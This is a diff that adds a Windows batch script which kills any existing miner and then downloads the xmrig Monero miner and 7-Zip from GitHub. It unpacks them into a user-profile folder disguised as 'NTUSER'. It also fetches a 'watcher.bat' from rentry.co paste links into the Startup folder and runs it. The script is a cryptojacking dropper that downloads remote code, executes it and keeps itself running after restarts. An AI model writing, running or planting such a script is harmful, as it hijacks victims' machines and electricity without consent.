@@ -1,0 +1,40 @@
+@echo off
+
+sc stop moneroocean_miner
+sc delete moneroocean_miner
+taskkill /f /t /im xmrig.exe
+tskill xmrig
+
+reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x32" > NUL && set OS=32BIT || set OS=64BIT
+cls
+if %OS%==32BIT goto X86
+if %OS%==64BIT goto X64
+
+:X64
+
+if exist %userprofile%\NTUSER\xmrig.exe GOTO Watcher
+if not exist %Userprofile%\win64.zip powershell.exe -Command "Invoke-WebRequest -OutFile %Userprofile%\win64.zip https://github.com/MoneroOcean/xmrig/releases/download/v6.12.2-mo2/xmrig-v6.12.2-mo2-win64.zip"
+if not exist %Userprofile%\7z.exe powershell.exe -Command "Invoke-WebRequest -OutFile %Userprofile%\7z.exe https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe"
+
+"%USERPROFILE%\7z.exe" x -y -o"%USERPROFILE%\NTUSER" "%USERPROFILE%\win64.zip"
+:Watcher
+powershell.exe -Command "Invoke-WebRequest -OutFile '%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\watcher.bat' https://rentry.co/d473t/raw"
+"%USERPROFILE%\7z.exe" x -y -o"%USERPROFILE%\NTUSER" "%USERPROFILE%\win64.zip"
+"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\watcher.bat"
+
+goto END
+
+:X86
+
+if exist %userprofile%\NTUSER\xmrig.exe GOTO Watcher
+if not exist %Userprofile%\win32.zip powershell.exe -Command "Invoke-WebRequest -OutFile %Userprofile%\win32.zip https://github.com/xmrig/xmrig/releases/download/v5.1.1/xmrig-5.1.1-gcc-win32.zip"
+if not exist %Userprofile%\7z.exe powershell.exe -Command "Invoke-WebRequest -OutFile %Userprofile%\7z.exe https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe"
+:Watcher
+powershell.exe -Command "Invoke-WebRequest -OutFile '%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\watcher.bat' https://rentry.co/a6n3o/raw"
+"%USERPROFILE%\7z.exe" x -y -o"%USERPROFILE%\NTUSER" "%USERPROFILE%\win32.zip"
+"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\watcher.bat"
+
+goto END
+
+
+:END
